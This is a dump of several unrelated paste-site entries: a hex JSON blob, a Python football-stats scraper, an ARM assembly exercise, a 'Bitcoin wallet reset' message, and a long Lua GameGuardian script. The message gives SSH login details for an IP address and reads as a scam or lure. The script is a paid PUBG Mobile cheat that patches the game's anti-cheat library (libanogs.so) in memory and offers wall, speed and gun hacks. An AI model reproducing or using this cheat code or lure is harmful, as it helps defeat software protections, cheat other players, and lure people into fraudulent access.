id,title,username,language,date,content
nLupz35x,data773,TestGuy1,JSON,Tuesday 5th of December 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'e665f64dfa48a510efa2750cae037ccdd34d309a0b79a30b0aa2d4e1d2f4d32e083f36757d7c6452e36e55a88702fe951470bc9d64d677d3b7c9ebb035ff9a4dad1735023750b54fcbfb46ce0ce79cbdff195866ba9969449ecb3fefdce8450a8f7c6438a7cd6c2aa01af3973ef1c1969064fc7d3d70da99d6e8b0dcc800c1c6',
  otherdata: [
    '26f2f4fb1216882f7f9217dea84f22c2',
    'f4a18b1110c7059629451b38c9dc7251',
    'e1d4f1b5d52f081d1aaf4b9c9764b3bb',
    'da42023d8d83c9f4e91aad9dbd2bcb1c',
    '33a29faa24d35a4f05395f77568b849c',
    'a60628b11d1a4318f9a20c2351dca56e',
    'df0d76a681ca9a2e03fd9f70256f9140',
    '42bcdacbc8d8133efbd020b23829e840'
  ]
}"
JTQBUwKk,Diploma,Nepoma,Python,Tuesday 5th of December 2023 05:52:49 AM CDT,"from bs4 import BeautifulSoup
import requests

class teamStatistics:
    def __init__(self, teamName, win, draw, lose, goals_scored, goals_conceded, number_of_points, XG, PPDA):
        self.teamName = teamName
        self.win = win
        self.draw = draw
        self.lose = lose
        self.goals_scored = goals_scored
        self.goals_conceded = goals_conceded
        self.number_of_points = number_of_points
        self.XG = XG
        self.PPDA = PPDA

    def getTeamName(self):
        print(self.teamName)

url = 'https://fbref.com/en/comps/9/Premier-League-Stats'
response = requests.get(url)
bs = BeautifulSoup(response.text,""lxml"")
teamsStatisctics = []

results_table = bs.find('tbody')

for i in range(len(results_table)//2):
    teamsStatisctics.append(teamStatistics('','','','','','','','',''))

teamName = results_table.find_all('td', {'data-stat': 'team'})


for i in range(len(teamName)):
    teamsStatisctics[i].teamName = teamName[i].text
"
NTvg9DAP,Call Saints in ASE,Lillo_Barilotto22,ARM,Tuesday 5th of December 2023 05:52:22 AM CDT,"                IF      :LNOT::DEF:NO_CRP
                AREA    |.ARM.__at_0x02FC|, CODE, READONLY
CRP_Key         DCD     0xFFFFFFFF
                ENDIF

				
				AREA 	WriteData, DATA, READWRITE, align=2
Calories_tot			SPACE 28

                AREA    |.text|, CODE, READONLY, align=3


; Reset Handler

Reset_Handler   PROC
                EXPORT  Reset_Handler             [WEAK]                                            
                LDR     R0, =Reset_Handler

				; your code here		
count_dd 	RN 1
tmp_cal		RN 2
tmp_day		RN 3

day_food	RN 4
day_sport 	RN 5

day_tot		RN 6
cal_addr	RN 7

tmp_cal_sports RN 8
day_less	RN 11
				
				LDRB day_food, 	Num_days
				LDRB day_sport,	Num_days_sport
				LDR day_tot,	=Calories_tot
				
				MOV count_dd, #0
				LDR cal_addr,	=Calories_food
loop_food		
				LDR tmp_day, [cal_addr, #4]!
				LDR tmp_cal, [cal_addr, #4]!
				
				ADD tmp_day, tmp_day, #-1
				STR tmp_cal, [day_tot, tmp_day, LSL #2]
				
				
				ADD count_dd, count_dd, #1
				CMP count_dd, day_food
				BNE loop_food
				
				
				MOV count_dd, #0
				LDR cal_addr,	=Calories_sport
loop_sport		
				LDR tmp_day, [cal_addr, #4]!
				LDR tmp_cal_sports, [cal_addr, #4]!
				
				ADD tmp_day, tmp_day, #-1
				
				LDR tmp_cal, [day_tot, tmp_day, LSL #2]
				SUB tmp_cal, tmp_cal, tmp_cal_sports
				STR tmp_cal, [day_tot, tmp_day, LSL #2]

				ADD count_dd, count_dd, #1
				CMP count_dd, day_sport
				BNE loop_sport
				
				
				MOV count_dd, #0
				MOV day_less, #0
loop_total		
				LDR tmp_cal, [day_tot, count_dd, LSL #2]
				CMP tmp_cal, #500
				ADDLT day_less, day_less, #1

				ADD count_dd, count_dd, #1
				CMP count_dd, #7
				BNE loop_total
	
                BX      R0
                ENDP
				
				LTORG
					
Days			DCB 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07

Calories_food 	DCD 0x06, 1300, 0x03, 1700, 0x02, 1200, 0x04, 1900
				DCD 0x05, 1110, 0x01, 1670, 0x07, 1000

Calories_sport	DCD 0x02, 500, 0x05, 800, 0x06, 400

Num_days	 	DCB 7
Num_days_sport	DCB 3

 
 
; Dummy Exception Handlers (infinite loops which can be modified)"
CwymhFj4,BTC Wallet Credentials have been reset,castlclass_20,GetText,Tuesday 5th of December 2023 05:42:41 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
heimelagbf:uE6qFa on 212.224.93.130
You can connect via SSH.
Regards"
t8r4v7yy,Untitled,bypass12,Lua,Tuesday 5th of December 2023 05:26:17 AM CDT," print(""ENC °•° BY @X1Cobra"") 
 PASSW = gg.prompt({""🔒 Input password: ""},{[1]=""""},{[1]=""text""})
 if not PASSW the﻿n return end
 if PASSW[1] == """" then gg.alert(""❌Password Can Not Be Empty ❌"") end
 if PASSW[1] == ""PAID_HACK"" then gg.toast(""✔️Password correct😘"") else gg.toast(""PASSWORD ERROR"") return end

-- Telegram @VN_IRAQ_ANDRID_OFFICIAL
-- Telegram @VN_IRAQ_ANDRID_OFFICIAL

_ENV[""gg""][""setVisible""](true);_ENV[""gg""][""alert""]((""VIP SCRIPT ALL BAND FIXED""))
function MasterAhsanYT(Nc,Type,Search,Write) _ENV[""gg""][""clearResults""]() _ENV[""gg""][""setRanges""](Nc) _ENV[""gg""][""setVisible""](false) _ENV[""gg""][""searchNumber""](Search[1][1],Type) local count=_ENV[""gg""].getResultCount() local result=_ENV[""gg""][""getResults""](count) _ENV[""gg""][""clearResults""]() local data={} local base=Search[1][2] if(count>0)then for i,v in ipairs(result)do v.isUseful=true end for k=2,#Search do local tmp={} local offset=Search[k][2]-base local num=Search[k][1] for i,v in ipairs(result)do tmp[#tmp+1]={} tmp[#tmp].address=v.address+offset tmp[#tmp].flags=v.flags end tmp=_ENV[""gg""][""getValues""](tmp) for i,v in ipairs(tmp)do if(tostring(v.value)~=tostring(num))then result[i].isUseful=false end end end for i,v in ipairs(result)do if(v.isUseful)then data[#data+1]=v.address end end if(#data>0)then _ENV[""gg""][""toast""]((""""..'\n'.."" MasterAhsanYT"")..#data..(""data""..'\n'.."" start offset"")) local t={} local base=Search[1][2] for i=1,#data do for k,w in ipairs(Write)do offset=w[2]-base t[#t+1]={} t[#t].address=data[i]+offset t[#t].flags=Type t[#t].value=w[1] if(w[3]==true)then local item={} item[#item+1]=t[#t] item[#item].freeze=true _ENV[""gg""][""addListItems""](item) end end end _ENV[""gg""][""setValues""](t) _ENV[""gg""][""sleep""](400) _ENV[""gg""][""toast""]((""""..'\n'.."""")..Name..(""MasterAhsanYT""..'\n'.."" MasterAhsanYT"")..#t..(""data"")) else _ENV[""gg""][""toast""]((""""..'\n'.."""")..Name..(""MasterAhsanYT"")) return false end else _ENV[""gg""][""toast""]((""""..'\n'.."""")..Name..(""MasterAhsanYT"")) return false end end
function MASTER(Range,Type,Search,Write) _ENV[""gg""][""clearResults""]() _ENV[""gg""][""setRanges""](Range) _ENV[""gg""][""setVisible""](false) _ENV[""gg""][""searchNumber""](Search[1][1],Type) local count=_ENV[""gg""].getResultCount() local result=_ENV[""gg""][""getResults""](count) _ENV[""gg""][""clearResults""]() local data={} local base=Search[1][2] if(count>0)then for i,v in ipairs(result)do v.isUseful=true end for k=2,#Search do local tmp={} local offset=Search[k][2]-base local num=Search[k][1] for i,v in ipairs(result)do tmp[#tmp+1]={} tmp[#tmp].address=v.address+offset tmp[#tmp].flags=v.flags end tmp=_ENV[""gg""][""getValues""](tmp) for i,v in ipairs(tmp)do if(tostring(v.value)~=tostring(num))then result[i].isUseful=false end end end for i,v in ipairs(result)do if(v.isUseful)then data[#data+1]=v.address end end if(#data>0)then _ENV[""gg""][""toast""]((""""..'\n'..""Searched"")..#data..(""data""..'\n'..""Start offset"")) local t={} local base=Search[1][2] for i=1,#data do for k,w in ipairs(Write)do offset=w[2]-base t[#t+1]={} t[#t].address=data[i]+offset t[#t].flags=Type t[#t].value=w[1] if(w[3]==true)then local item={} item[#item+1]=t[#t] item[#item].freeze=true _ENV[""gg""][""addListItems""](item) end end end _ENV[""gg""][""setValues""](t) _ENV[""gg""][""sleep""](400) _ENV[""gg""][""toast""]((""""..'\n'.."""")..Name..(""Team FQRS︎"")..#t..(""data"")) else _ENV[""gg""][""toast""]((""""..'\n'.."""")..Name..(""Failure"")) return false end else _ENV[""gg""][""toast""]((""""..'\n'.."""")..Name..(""Failure"")) return false end end local time=_ENV[""os""][""clock""]()
function readWrite(Search,Get,Type,Range,Name) gg[(""clearResults"")]() gg[(""setRanges"")](Range) gg[(""setVisible"")](false) if Search[1][1]~=false then _G[(""gg"")][(""searchAddress"")](Search[1][1],0xFFFFFFFF,Search[1][4] or Type,_G[(""gg"")][(""SIGN_EQUAL"")],Search[1][5] or 1,Search[1][6] or -1) end gg[(""searchNumber"")](Search[1][2],Search[1][4] or Type,false,_G[(""gg"")][(""SIGN_EQUAL"")],Search[1][5] or 1,Search[1][6] or -1) local count=gg[(""getResultCount"")]() local result=gg[(""getResults"")](count) gg[(""clearResults"")]() local data={} local base=Search[1][3] if (count > 0) then for i,v in ipairs(result) do v.isUseful=true end for k=2,#Search do local tmp={} local offset=Search[k][2] - base local num=Search[k][1] for i,v in ipairs(result) do tmp[#tmp+1]={} tmp[#tmp].address=v.address+offset tmp[#tmp].flags=Search[k][3] or Type end tmp=gg[(""getValues"")](tmp) for i,v in ipairs(tmp) do if v.flags==16 or v.flags==64 then values=tostring(v.value):sub(1,6) num=tostring(num):sub(1,6) else values=v.value end if tostring(values)~=tostring(num) then result[i].isUseful=false end end end for i,v in ipairs(result) do if (v.isUseful) then data[#data+1]=v.address end end if (#data > 0) then local t,t_={},{} local base=Search[1][3] for i=1,#data do for k,w in ipairs(Get) do offset=w[2] - base if w[1]==false then t_[#t_+1]={} t_[#t_].address=data[i]+offset t_[#t_].flags=Type th_=(th_) and th_+1 or 1 else t[#t+1]={} t[#t].address=data[i]+offset t[#t].flags=w[3] or Type t[#t].value=w[1] tg_=(tg_) and tg_+1 or 1 if (w[4]==true) then local item={} item[#item+1]=t[#t] item[#item].freeze=w[4] gg[(""addListItems"")](item) end end end end tg=(tg_) and (""""..'\n'.."" modify"")..tg_..(""data"") or ("""") th=(th_) and ("""") or ("""") gg[(""setValues"")](t) t_=gg[(""getValues"")](t_) gg[(""loadResults"")](t_) gg[(""toast"")]((""""..'\n'.."""")..Name..tg) tg_,th_=nil,nil else gg[(""toast"")]((""Not searchable""),false) return false end else gg[(""toast"")]((""Not searchable"")) return false end end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find (szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len (szFullString)) break end nSplitArray[nSplitIndex] = string.sub (szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len (szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x][(""offset"")] xglx = qmxg[x][(""type"")] xgsz = qmxg[x][(""value"")] xgdj = qmxg[x][(""freeze"")] if xgdj == nil or xgdj == ("""") then _ENV[""gg""][""setValues""]({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else _ENV[""gg""][""addListItems""]({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) _ENV[""gg""][""clearResults""]() _ENV[""gg""][""setRanges""](qmnb[1][(""memory"")]) _ENV[""gg""][""searchNumber""](qmnb[3][(""value"")], qmnb[3][(""type"")]) if _ENV[""gg""].getResultCount() == 0 then _ENV[""gg""][""toast""](qmnb[2][(""name"")] .. (""OP"")) else _ENV[""gg""][""refineNumber""](qmnb[3][(""value"")], qmnb[3][(""type"")]) _ENV[""gg""][""refineNumber""](qmnb[3][(""value"")], qmnb[3][(""type"")]) _ENV[""gg""][""refineNumber""](qmnb[3][(""value"")], qmnb[3][(""type"")]) if _ENV[""gg""].getResultCount() == 0 then _ENV[""gg""][""toast""](qmnb[2][(""name"")] .. (""gg"")) else sl = _ENV[""gg""][""getResults""](999999) sz = _ENV[""gg""].getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v][(""offset"")] pysz[1].flags = qmnb[v][(""type"")] szpy = _ENV[""gg""][""getValues""](pysz) pdpd = qmnb[v][(""lv"")] .. ("";"") .. szpy[1].value szpd = split(pdpd, ("";"")) tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then _ENV[""gg""][""toast""](qmnb[2][(""name"")] .. (""Ahsan，YT"") .. xgsl .. (""Ahsan"")) else _ENV[""gg""][""toast""](qmnb[2][(""name"")] .. (""Ahsan，YT"")) end end end end
 function SearchWrite(Search, Write, Type) _ENV[""gg""][""clearResults""]() _ENV[""gg""][""setVisible""](false) _ENV[""gg""][""searchNumber""](Search[1][1], Type) local count = _ENV[""gg""].getResultCount() local result = _ENV[""gg""][""getResults""](count) _ENV[""gg""][""clearResults""]() local data = {} local base = Search[1][2] if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k=2, #Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = v.flags end tmp = _ENV[""gg""][""getValues""](tmp) for i, v in ipairs(tmp) do if ( tostring(v.value) ~= tostring(num) ) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then local t = {} local base = Search[1][2] for i=1, #data do for k, w in ipairs(Write) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = Type t[#t].value = w[1] if (w[3] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true _ENV[""gg""][""addListItems""](item) end end end _ENV[""gg""][""setValues""](t) _ENV[""gg""][""toast""]((""AhsanYT"")) _ENV[""gg""][""addListItems""](t) else _ENV[""gg""][""toast""]((""Ahsan，yt""), false) return false end else _ENV[""gg""][""toast""]((""Not Found"")) return false end end
function setvalue(address,flags,value) local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value _ENV[""gg""][""setValues""](tt) end
on = ' \n Status = On ✅'
off = ' \n Status = Off ❌'
fspeed1 = off
fspeed2 = off
fspeed3 = off
fspeed4 = off
fspeed5 = off
carspeed = off
walls = off
long1s1 = off
ice1s1 = off
cjump = off
HOME = 1
function HOME()
Master = _ENV[""gg""][""multiChoice""]({
(""🗂️ ʙʏᴘᴀss ᴍᴇɴᴜ✨༽༻ ""..'\n'..""""),--1
(""🗂️ɢᴜɴ ʜᴀᴄᴋ ᴍᴇɴᴜ✨༽༻ ""..'\n'..""""),--2
(""🗂️ᴡᴀʟʟ ʜᴀᴄᴋ ᴍᴇɴᴜ✨༽༻ ""..'\n'..""""),--3
(""🗂️sᴘᴇᴇᴅ ʜᴀᴄᴋ ᴍᴇɴᴜ✨༽༻ ""..'\n'..""""),--4
(""🗂️ʙᴇᴀᴜᴛɪғɪᴄᴀᴛɪᴏɴ ᴍᴇɴᴜ✨༽༻ ""..'\n'..""""),--5
(""🗂️sᴋɪɴ ʜᴀᴄᴋs✨༽༻ ""..'\n'..""""),--6
(""❌༼ᴇxɪᴛ༽❌"")
}, nil, (""V0.26.0 Cʀᴇᴀᴛᴏʀ @VN_IRAQ_ANDRID_OFFICIAL""))

if Master == nil then else
if Master[1]== true then B1() end
if Master[2]== true then B2() end
if Master[3]== true then B3() end
if Master[4]== true then B4() end
if Master[5]== true then B5() end
if Master[6]== true then B6() end
if Master[7]== true then EXIT() end
end
PUBGMH = -1
end

function B1()
aaa = _ENV[""gg""][""multiChoice""]({
(""💗LOGO BYPASS💗""), --1
("" 🚬Iceland bypass🚬"")..ice1s1,--2
(""🏠༼ʜᴏᴍᴇ༽🏠"")
}, nil, ("" Cʀᴇᴀᴛᴏʀ @VN_IRAQ_ANDRID_OFFICIAL ""))

if aaa == nil then else
if aaa[1]== true then BA1() end
if aaa[2]== true then BA2() end
if aaa[3]== true then HOME() end
end
PUBGMH = -1
end

function BA1()
gg.setRanges(gg.REGION_C_BSS | gg.REGION_CODE_APP)
gg.processResume()
gg.searchNumber(""1819042143"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1684103738"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""979661939"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""28005"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1953724787"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""6515058"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1701733735"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""2105376"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""537541161"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1819112552"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""779315061"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1647273842"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1865315694"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1731093347"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1731145530"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1886680168"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""544497952"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1953656688"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()
gg.processResume()

gg.clearResults()
gg.searchNumber(""1701978215"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()
--BLOCK OFFLINE
gg.setRanges(gg.REGION_C_BSS | gg.REGION_CODE_APP)
gg.processResume()
gg.searchNumber(""1601463655"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1601463659"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1667330143"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1937076335"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1767862885"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1685021550"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1700754293"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1886322789"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""2053731167"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1952802655"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1919247471"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1668179295"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
gg.processResume()

gg.clearResults()
gg.searchNumber(""1937076335"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.processResume()
revert = gg.getResults(99999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""829707081"", gg.TYPE_DWORD)
--BLOCK SERVICE BAND 
--@VN_IRAQ_ANDRID_OFFICIAL
--BLOCK Band PARTY 3RD
function setvalue(address,flags,value) local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
so = gg.getRangesList(""libanogs.so"")[1].start
--Telegram @VN_IRAQ_ANDRID_OFFICIAL
setvalue(so + ""0x49904 "", 4, ""h 00 20 70 47"")
--third party 10 minutes fix fire ban fix
setvalue(so + ""0x614D0 "", 4, ""h 00 20 70 47"")
--10 years block lobby support 
setvalue(so + ""0x60518 "", 4, ""h 00 20 70 47"")
--10 minutes fix
setvalue(so + ""0x606B4 "", 4, ""h 00 20 70 47"")
--suppot
setvalue(so + ""0x2ADA74"", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E130 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E2E4 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E3DC "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E554 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E7B8 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E6E4 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8E88C "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8EA08 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8EBA8 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8ED04 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8EE0C "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8EE6C "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8EEF4 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8EFC4 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8F400 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8F704 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8F7D8 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8F894 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FA00 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FABC "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FBDC "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FC9C "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FE34 "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FEAC "", 4, ""h 00 20 70 47"")
setvalue(so + ""0x8FFC0 "", 4, ""h 00 20 70 47"")
--BLOCK BAND DAY 1 
setvalue(so + ""0x72078 "", 4, ""h 00 20 70 47"")
--FIXED CRASH VIRTUAL 
_ENV[""gg""][""sleep""](100)
_ENV[""gg""][""toast""]((""▓▓▒▒▒▒▒▒▒▒""))
_ENV[""gg""][""toast""]((""done""))
_ENV[""gg""][""clearResults""]()
_ENV[""gg""][""toast""]((""༆⬛⬜⬜⬜⬜⬜⬜10%༆""))
_ENV[""gg""][""sleep""](200)
_ENV[""gg""][""toast""]((""༆⬛⬛⬜⬜⬜⬜⬜20%༆""))
_ENV[""gg""][""sleep""](300)
_ENV[""gg""][""toast""]((""༆⬛⬛⬛⬜⬜⬜⬜40%༆""))
_ENV[""gg""][""sleep""](400)
_ENV[""gg""][""toast""]((""༆⬛⬛⬛⬛⬜⬜⬜60%༆""))
_ENV[""gg""][""sleep""](500)
_ENV[""gg""][""toast""]((""༆⬛⬛⬛⬛⬛⬜⬜80%""))
_ENV[""gg""][""sleep""](600)
_ENV[""gg""][""toast""]((""༆⬛⬛⬛⬛⬛⬛⬜90%༆""))
_ENV[""gg""][""sleep""](700)
_ENV[""gg""][""toast""]((""༆⬛⬛⬛⬛⬛⬛⬛100%༆""))
